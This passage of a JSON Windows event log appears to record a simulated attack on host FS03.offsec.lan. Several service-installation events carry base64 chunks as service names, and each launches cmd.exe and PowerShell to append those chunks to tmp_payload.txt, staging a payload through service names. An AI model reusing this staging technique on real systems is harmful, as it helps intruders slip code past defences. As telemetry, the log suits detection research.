    "timestamp": "2021-11-03 08:18:41.440752+00:00",
    "event_data": {
      "ServiceName": "ZW50c1BlclNlY29uZCAtPiAgVGhlIGF2ZyBldmVudHMgcGVyIHNlY29uZCBmb3IgdGhlIGdpdmVuIGxvZw0KI0BwYXJhbSAkVG90YWxMb2dFdmVudHMgICAgIC0+ICBUaGUgdG90YWwgIyBvZiBldm",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg143\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105263": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:19:29.482460+00:00",
    "event_data": {
      "ServiceName": "oNCiNAcGFyYW0gJERlc2NyaXB0aW9uIC0+ICBUaGUgRGVzY3JpcHRpb24gb2YgdGhlIERpYWxvZw0KI0BwYXJhbSAkUm9vdEZvbGRlciAgLT4gIFRoZSBsb2NhdGlvbiB0aGF0IHRoZSBmb2xkZXIg",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg176\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105264": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:19:29.482460+00:00",
    "event_data": {
      "ServiceName": "oNCiNAcGFyYW0gJERlc2NyaXB0aW9uIC0+ICBUaGUgRGVzY3JpcHRpb24gb2YgdGhlIERpYWxvZw0KI0BwYXJhbSAkUm9vdEZvbGRlciAgLT4gIFRoZSBsb2NhdGlvbiB0aGF0IHRoZSBmb2xkZXIg",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg176\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105355": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:20:36.582958+00:00",
    "event_data": {
      "ServiceName": "MjIyMjIyMNCiNGdW5jdGlvbiB3aWxsIGxvZyBtZXNzYWdlcyB0aHJvdWdob3V0IHRoZSBzY3JpcHQgZXhlY3V0aW9uIA0KDQojQHBhcmFtICRzZXZlcml0eSAgIC0+IEhvdyBzZXZlcmUgb2YgdGhl",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg222\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105356": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:20:36.582958+00:00",
    "event_data": {
      "ServiceName": "MjIyMjIyMNCiNGdW5jdGlvbiB3aWxsIGxvZyBtZXNzYWdlcyB0aHJvdWdob3V0IHRoZSBzY3JpcHQgZXhlY3V0aW9uIA0KDQojQHBhcmFtICRzZXZlcml0eSAgIC0+IEhvdyBzZXZlcmUgb2YgdGhl",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg222\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105357": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:20:38.020479+00:00",
    "event_data": {
      "ServiceName": "IGlucHV0IG1lc3NhZ2UgdG8gbG9nICAgDQojQHBhcmFtICRsb2dNZXNzYWdlIC0+IFRoZSBtZXNzYWdlIHRoYXQgd2lsbCBiZSBsb2dnZWQgY2FzdCB0byBhIHN0cmluZw0KDQojIyMjIyMjIyMjIy",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg223\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  },
  "105358": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-11-03 08:20:38.020479+00:00",
    "event_data": {
      "ServiceName": "IGlucHV0IG1lc3NhZ2UgdG8gbG9nICAgDQojQHBhcmFtICRsb2dNZXNzYWdlIC0+IFRoZSBtZXNzYWdlIHRoYXQgd2lsbCBiZSBsb2dnZWQgY2FzdCB0byBhIHN0cmluZw0KDQojIyMjIyMjIyMjIy",
      "ImagePath": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg223\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
    }
  }
}